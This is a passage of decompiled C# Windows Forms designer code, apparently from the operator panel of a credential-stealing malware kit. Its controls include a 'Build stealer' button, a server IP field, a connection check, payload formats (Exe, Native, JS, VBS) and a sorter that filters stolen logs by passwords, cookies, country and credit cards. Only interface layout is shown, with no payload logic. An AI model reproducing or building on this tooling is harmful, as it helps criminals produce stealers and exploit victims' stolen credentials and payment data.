        ((System.Windows.Forms.Control)this.singleCCsSortCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.singleCCsSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.singleCCsSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.singleCCsSortCb).Location = new System.Drawing.Point(381, 351);
        ((System.Windows.Forms.Control)this.singleCCsSortCb).Name = "singleCCsSortCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.singleCCsSortCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.singleCCsSortCb).TabIndex = 104;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleCCsSortCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.label13).AutoSize = true;
        ((System.Windows.Forms.Control)this.label13).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label13).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label13).Location = new System.Drawing.Point(198, 351);
        ((System.Windows.Forms.Control)this.label13).Name = "label13";
        ((System.Windows.Forms.Control)this.label13).Size = new System.Drawing.Size(73, 15);
        ((System.Windows.Forms.Control)this.label13).TabIndex = 76;
        ((System.Windows.Forms.Control)this.label13).Text = "Credit cards:";
        ((GuiLib.AnimaTextBox)this.singleCountrySortTb).Dark = false;
        ((System.Windows.Forms.Control)this.singleCountrySortTb).Location = new System.Drawing.Point(135, 33);
        ((GuiLib.AnimaTextBox)this.singleCountrySortTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.singleCountrySortTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.singleCountrySortTb).Name = "singleCountrySortTb";
        ((GuiLib.AnimaTextBox)this.singleCountrySortTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.singleCountrySortTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.singleCountrySortTb).Size = new System.Drawing.Size(265, 23);
        ((System.Windows.Forms.Control)this.singleCountrySortTb).TabIndex = 75;
        ((GuiLib.AnimaTextBox)this.singleCountrySortTb).UseSystemPasswordChar = false;
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.singleSort).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.singleSort).Location = new System.Drawing.Point(30, 525);
        ((System.Windows.Forms.Control)this.singleSort).Name = "singleSort";
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.singleSort).Size = new System.Drawing.Size(149, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).StyleManager = null;
        ((System.Windows.Forms.Control)this.singleSort).TabIndex = 74;
        ((System.Windows.Forms.Control)this.singleSort).Text = "Sort";
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.singleSort).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.singleSort).Click += new System.EventHandler(singleSort_Click);
        ((GuiLib.AnimaTextBox)this.singleCookieSortTb).Dark = false;
        ((System.Windows.Forms.Control)this.singleCookieSortTb).Location = new System.Drawing.Point(194, 243);
        ((GuiLib.AnimaTextBox)this.singleCookieSortTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.singleCookieSortTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.singleCookieSortTb).Name = "singleCookieSortTb";
        ((GuiLib.AnimaTextBox)this.singleCookieSortTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.singleCookieSortTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.singleCookieSortTb).Size = new System.Drawing.Size(206, 23);
        ((System.Windows.Forms.Control)this.singleCookieSortTb).TabIndex = 73;
        ((GuiLib.AnimaTextBox)this.singleCookieSortTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label12).AutoSize = true;
        ((System.Windows.Forms.Control)this.label12).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label12).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label12).Location = new System.Drawing.Point(28, 246);
        ((System.Windows.Forms.Control)this.label12).Name = "label12";
        ((System.Windows.Forms.Control)this.label12).Size = new System.Drawing.Size(147, 15);
        ((System.Windows.Forms.Control)this.label12).TabIndex = 72;
        ((System.Windows.Forms.Control)this.label12).Text = "Cookies Contains Domain:";
        ((System.Windows.Forms.Control)this.metroSetDivider12).Location = new System.Drawing.Point(473, -6);
        ((System.Windows.Forms.Control)this.metroSetDivider12).Name = "metroSetDivider12";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider12).Orientation = MetroSet_UI.Enums.DividerStyle.Vertical;
        ((System.Windows.Forms.Control)this.metroSetDivider12).Size = new System.Drawing.Size(4, 637);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider12).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider12).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider12).TabIndex = 71;
        ((System.Windows.Forms.Control)this.metroSetDivider12).Text = "metroSetDivider12";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider12).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider12).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider12).Thickness = 1;
        ((GuiLib.AnimaTextBox)this.singlePasswordSortTb).Dark = false;
        ((System.Windows.Forms.Control)this.singlePasswordSortTb).Location = new System.Drawing.Point(194, 211);
        ((GuiLib.AnimaTextBox)this.singlePasswordSortTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.singlePasswordSortTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.singlePasswordSortTb).Name = "singlePasswordSortTb";
        ((GuiLib.AnimaTextBox)this.singlePasswordSortTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.singlePasswordSortTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.singlePasswordSortTb).Size = new System.Drawing.Size(206, 23);
        ((System.Windows.Forms.Control)this.singlePasswordSortTb).TabIndex = 70;
        ((GuiLib.AnimaTextBox)this.singlePasswordSortTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label11).AutoSize = true;
        ((System.Windows.Forms.Control)this.label11).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label11).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label11).Location = new System.Drawing.Point(28, 214);
        ((System.Windows.Forms.Control)this.label11).Name = "label11";
        ((System.Windows.Forms.Control)this.label11).Size = new System.Drawing.Size(160, 15);
        ((System.Windows.Forms.Control)this.label11).TabIndex = 69;
        ((System.Windows.Forms.Control)this.label11).Text = "Passwords Contains Domain:";
        ((GuiLib.AnimaTextBox)this.singleCommentSortTb).Dark = false;
        ((System.Windows.Forms.Control)this.singleCommentSortTb).Location = new System.Drawing.Point(135, 89);
        ((GuiLib.AnimaTextBox)this.singleCommentSortTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.singleCommentSortTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.singleCommentSortTb).Name = "singleCommentSortTb";
        ((GuiLib.AnimaTextBox)this.singleCommentSortTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.singleCommentSortTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.singleCommentSortTb).Size = new System.Drawing.Size(265, 23);
        ((System.Windows.Forms.Control)this.singleCommentSortTb).TabIndex = 68;
        ((GuiLib.AnimaTextBox)this.singleCommentSortTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label10).AutoSize = true;
        ((System.Windows.Forms.Control)this.label10).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label10).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label10).Location = new System.Drawing.Point(28, 91);
        ((System.Windows.Forms.Control)this.label10).Name = "label10";
        ((System.Windows.Forms.Control)this.label10).Size = new System.Drawing.Size(64, 15);
        ((System.Windows.Forms.Control)this.label10).TabIndex = 67;
        ((System.Windows.Forms.Control)this.label10).Text = "Comment:";
        ((GuiLib.AnimaTextBox)this.singleIdSortTb).Dark = false;
        ((System.Windows.Forms.Control)this.singleIdSortTb).Location = new System.Drawing.Point(135, 61);
        ((GuiLib.AnimaTextBox)this.singleIdSortTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.singleIdSortTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.singleIdSortTb).Name = "singleIdSortTb";
        ((GuiLib.AnimaTextBox)this.singleIdSortTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.singleIdSortTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.singleIdSortTb).Size = new System.Drawing.Size(265, 23);
        ((System.Windows.Forms.Control)this.singleIdSortTb).TabIndex = 65;
        ((GuiLib.AnimaTextBox)this.singleIdSortTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label9).AutoSize = true;
        ((System.Windows.Forms.Control)this.label9).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label9).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label9).Location = new System.Drawing.Point(28, 62);
        ((System.Windows.Forms.Control)this.label9).Name = "label9";
        ((System.Windows.Forms.Control)this.label9).Size = new System.Drawing.Size(48, 15);
        ((System.Windows.Forms.Control)this.label9).TabIndex = 64;
        ((System.Windows.Forms.Control)this.label9).Text = "BuildID:";
        ((System.Windows.Forms.Control)this.label8).AutoSize = true;
        ((System.Windows.Forms.Control)this.label8).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label8).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label8).Location = new System.Drawing.Point(28, 33);
        ((System.Windows.Forms.Control)this.label8).Name = "label8";
        ((System.Windows.Forms.Control)this.label8).Size = new System.Drawing.Size(53, 15);
        ((System.Windows.Forms.Control)this.label8).TabIndex = 61;
        ((System.Windows.Forms.Control)this.label8).Text = "Country:";
        ((System.Windows.Forms.Control)this.singleStatusLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.singleStatusLbl).Location = new System.Drawing.Point(136, 3);
        ((System.Windows.Forms.Control)this.singleStatusLbl).Name = "singleStatusLbl";
        ((System.Windows.Forms.Control)this.singleStatusLbl).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.singleStatusLbl).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.singleStatusLbl).StyleManager = null;
        ((System.Windows.Forms.Control)this.singleStatusLbl).TabIndex = 60;
        ((System.Windows.Forms.Control)this.singleStatusLbl).Text = "Waiting";
        ((System.Windows.Forms.Label)this.singleStatusLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.singleStatusLbl).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.singleStatusLbl).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.metroSetLabel1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.metroSetLabel1).Location = new System.Drawing.Point(16, 3);
        ((System.Windows.Forms.Control)this.metroSetLabel1).Name = "metroSetLabel1";
        ((System.Windows.Forms.Control)this.metroSetLabel1).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel1).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel1).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetLabel1).TabIndex = 59;
        ((System.Windows.Forms.Control)this.metroSetLabel1).Text = "Status of sorter:";
        ((System.Windows.Forms.Label)this.metroSetLabel1).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel1).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel1).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.builderTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.buildType);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.label59);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.errorMessageTb);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.label46);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.c0);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.buildIdTb);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.label20);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.serverIpTb);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.label19);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.createBuildBtn);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.openIconBtn);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.iconPath);
        ((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.label18);
        ((System.Windows.Forms.Control)this.builderTab).Font = new System.Drawing.Font("Segoe UI", 9f);
        ((System.Windows.Forms.Control)this.builderTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.builderTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.builderTab).Name = "builderTab";
        ((System.Windows.Forms.Control)this.builderTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.builderTab).TabIndex = 6;
        ((System.Windows.Forms.Control)this.builderTab).Text = "Builder";
        ((System.Windows.Forms.Control)this.buildType).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ComboBox)this.buildType).FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        ((System.Windows.Forms.Control)this.buildType).Font = new System.Drawing.Font("Segoe UI", 9f);
        ((System.Windows.Forms.Control)this.buildType).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListControl)this.buildType).FormattingEnabled = true;
        ((System.Windows.Forms.ComboBox)this.buildType).Items.AddRange(new object[4] { "Exe", "Native", "JS", "VBS" });
        ((System.Windows.Forms.Control)this.buildType).Location = new System.Drawing.Point(418, 347);
        ((System.Windows.Forms.Control)this.buildType).Name = "buildType";
        ((System.Windows.Forms.Control)this.buildType).Size = new System.Drawing.Size(103, 23);
        ((System.Windows.Forms.Control)this.buildType).TabIndex = 147;
        ((System.Windows.Forms.Control)this.buildType).Text = "Exe";
        ((System.Windows.Forms.Control)this.label59).AutoSize = true;
        ((System.Windows.Forms.Control)this.label59).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label59).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label59).Location = new System.Drawing.Point(343, 351);
        ((System.Windows.Forms.Control)this.label59).Name = "label59";
        ((System.Windows.Forms.Control)this.label59).Size = new System.Drawing.Size(66, 15);
        ((System.Windows.Forms.Control)this.label59).TabIndex = 146;
        ((System.Windows.Forms.Control)this.label59).Text = "Build Type:";
        ((GuiLib.AnimaTextBox)this.errorMessageTb).Dark = false;
        ((System.Windows.Forms.Control)this.errorMessageTb).Location = new System.Drawing.Point(342, 318);
        ((GuiLib.AnimaTextBox)this.errorMessageTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.errorMessageTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.errorMessageTb).Name = "errorMessageTb";
        ((GuiLib.AnimaTextBox)this.errorMessageTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.errorMessageTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.errorMessageTb).Size = new System.Drawing.Size(438, 23);
        ((System.Windows.Forms.Control)this.errorMessageTb).TabIndex = 68;
        ((GuiLib.AnimaTextBox)this.errorMessageTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label46).AutoSize = true;
        ((System.Windows.Forms.Control)this.label46).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label46).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label46).Location = new System.Drawing.Point(342, 300);
        ((System.Windows.Forms.Control)this.label46).Name = "label46";
        ((System.Windows.Forms.Control)this.label46).Size = new System.Drawing.Size(84, 15);
        ((System.Windows.Forms.Control)this.label46).TabIndex = 67;
        ((System.Windows.Forms.Control)this.label46).Text = "Error message:";
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.c0).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.c0).Location = new System.Drawing.Point(660, 229);
        ((System.Windows.Forms.Control)this.c0).Name = "checkConnectionBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.c0).Size = new System.Drawing.Size(120, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).StyleManager = null;
        ((System.Windows.Forms.Control)this.c0).TabIndex = 65;
        ((System.Windows.Forms.Control)this.c0).Text = "Check connection";
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.c0).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.c0).Click += new System.EventHandler(c0_Click);
        ((GuiLib.AnimaTextBox)this.buildIdTb).Dark = false;
        ((System.Windows.Forms.Control)this.buildIdTb).Location = new System.Drawing.Point(342, 275);
        ((GuiLib.AnimaTextBox)this.buildIdTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.buildIdTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.buildIdTb).Name = "buildIdTb";
        ((GuiLib.AnimaTextBox)this.buildIdTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.buildIdTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.buildIdTb).Size = new System.Drawing.Size(438, 23);
        ((System.Windows.Forms.Control)this.buildIdTb).TabIndex = 52;
        ((GuiLib.AnimaTextBox)this.buildIdTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label20).AutoSize = true;
        ((System.Windows.Forms.Control)this.label20).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label20).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label20).Location = new System.Drawing.Point(342, 257);
        ((System.Windows.Forms.Control)this.label20).Name = "label20";
        ((System.Windows.Forms.Control)this.label20).Size = new System.Drawing.Size(51, 15);
        ((System.Windows.Forms.Control)this.label20).TabIndex = 51;
        ((System.Windows.Forms.Control)this.label20).Text = "Build ID:";
        ((GuiLib.AnimaTextBox)this.serverIpTb).Dark = false;
        ((System.Windows.Forms.Control)this.serverIpTb).Location = new System.Drawing.Point(342, 229);
        ((GuiLib.AnimaTextBox)this.serverIpTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.serverIpTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.serverIpTb).Name = "serverIpTb";
        ((GuiLib.AnimaTextBox)this.serverIpTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.serverIpTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.serverIpTb).Size = new System.Drawing.Size(312, 23);
        ((System.Windows.Forms.Control)this.serverIpTb).TabIndex = 50;
        ((GuiLib.AnimaTextBox)this.serverIpTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label19).AutoSize = true;
        ((System.Windows.Forms.Control)this.label19).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label19).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label19).Location = new System.Drawing.Point(342, 211);
        ((System.Windows.Forms.Control)this.label19).Name = "label19";
        ((System.Windows.Forms.Control)this.label19).Size = new System.Drawing.Size(55, 15);
        ((System.Windows.Forms.Control)this.label19).TabIndex = 49;
        ((System.Windows.Forms.Control)this.label19).Text = "Server IP:";
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.createBuildBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.createBuildBtn).Location = new System.Drawing.Point(660, 347);
        ((System.Windows.Forms.Control)this.createBuildBtn).Name = "createBuildBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.createBuildBtn).Size = new System.Drawing.Size(120, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.createBuildBtn).TabIndex = 48;
        ((System.Windows.Forms.Control)this.createBuildBtn).Text = "Build stealer";
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.createBuildBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.createBuildBtn).Click += new System.EventHandler(createBuildBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.openIconBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openIconBtn).Location = new System.Drawing.Point(715, 183);
